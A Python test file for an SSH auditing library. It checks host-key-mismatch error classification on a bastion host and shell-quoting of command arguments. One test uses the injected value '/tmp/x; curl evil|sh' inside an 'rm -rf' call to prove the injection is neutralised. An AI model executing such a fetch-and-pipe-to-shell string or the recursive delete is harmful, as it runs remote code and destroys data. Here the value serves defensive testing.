"""Tests for grc_auditor.remote error classification.

Focus: a host-key MISMATCH on the BASTION must keep its security-signal type so
the caller routes it to HOST_KEY_MISMATCH, not plain UNREACHABLE. No live SSH --
we drive the pure classifier with fabricated paramiko exceptions.
"""

from __future__ import annotations

import base64
import socket

import paramiko

from grc_auditor.remote import (
    BastionError, CommandResult, HostKeyMismatch, RemoteHost, _bastion_error,
)


def test_run_argv_quotes_every_token():
    # run_argv must shell-quote each token so a value containing shell
    # metacharacters (e.g. derived from a hostile target's command output)
    # cannot break out of the intended argument and inject a command.
    captured = {}

    class _Conn(RemoteHost):
        def __init__(self):
            pass

        def run(self, command, *, sudo=False, timeout=None):
            captured["command"] = command
            captured["sudo"] = sudo
            return CommandResult(0, "", "")

    _Conn().run_argv(["rm", "-rf", "/tmp/x; curl evil|sh"], sudo=True)
    assert captured["command"] == "rm -rf '/tmp/x; curl evil|sh'"
    assert captured["sudo"] is True


class _FakeKey:
    """Minimal stand-in for a paramiko host key (the bits remote.py touches)."""

    def __init__(self, name="ssh-ed25519", blob=b"\x01\x02\x03"):
        self._name = name
        self._blob = blob

    def asbytes(self) -> bytes:
        return self._blob

    def get_name(self) -> str:
        return self._name

    def get_base64(self) -> str:
        return base64.b64encode(self._blob).decode("ascii")


def test_bastion_host_key_mismatch_preserves_security_signal():
    # A key mismatch on the jump host is a possible MITM -- it must surface as a
    # HostKeyMismatch (which cli routes to HOST_KEY_MISMATCH), not be flattened
    # into a generic BastionError that demotes it to UNREACHABLE.
    exc = paramiko.BadHostKeyException(
        "bastion.example.com", _FakeKey(blob=b"got"), _FakeKey(blob=b"want")
    )
    err = _bastion_error(exc, "bastion jump@bastion.example.com:22")

    assert isinstance(err, HostKeyMismatch)
    assert not isinstance(err, BastionError)   # type not flattened
    assert "bastion" in str(err).lower()


def test_bastion_non_key_failure_is_a_bastion_error():
    err = _bastion_error(socket.timeout("timed out"),
                         "bastion jump@bastion.example.com:22")

    assert isinstance(err, BastionError)
    assert not isinstance(err, HostKeyMismatch)
